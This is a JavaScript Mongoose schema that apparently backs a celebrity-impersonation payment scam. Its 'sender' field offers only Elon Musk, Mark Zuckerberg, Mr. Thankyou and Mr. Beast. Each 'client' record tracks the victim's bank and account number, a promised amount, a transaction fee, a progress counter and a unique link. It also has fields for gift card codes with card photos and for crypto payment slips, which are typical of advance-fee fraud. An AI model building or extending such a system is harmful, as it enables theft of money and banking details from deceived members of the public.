const mongoose = require("mongoose");

const clientSchema = new mongoose.Schema(
  {
    author: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "Admin",
      required: true,
    },

    sender: {
      type: String,
      required: true,
      default: "Elon Musk",
      enum: ["Elon Musk", "Mark Zuckerberg", "Mr. Thankyou", "Mr. Beast"],
    },

    // Client info
    name: { type: String, required: true },
    phone: { type: String, required: true },
    message: { type: String },

    // Payment info
    bank: { type: String, required: true },
    accountNumber: { type: String, required: true },
    amount: { type: Number, required: true },
    amountInWords: { type: String },
    currency: { type: String, default: "USD" },
    txsFee: { type: Number, default: 0 },

    // Transaction info
    transactionId: { type: String },
    initiatedAt: { type: Date, default: Date.now },
    progress: { type: Number, default: 0 },

    // Status updated for Accept/Decline flow
    status: {
      type: String,
      enum: ["initiated", "pending", "successful", "declined"],
      default: "initiated",
    },

    // Support details
    support: {
      contact: { type: String },
    },

    // Gift card details
    giftCard: {
      code: { type: String },
      frontImageUrl: { type: String },
      backImageUrl: { type: String },
      type: { type: String },
    },

    // Crypto transaction details
    cryptoTransaction: {
      type: { type: String, default: "Bitcoin" },
      slipImageUrl: { type: String },
      transactionHash: { type: String },
    },

    // Unique client link
    link: {
      type: String,
      required: true,
    },
  },
  { timestamps: true }
);

module.exports = mongoose.model("Client", clientSchema);
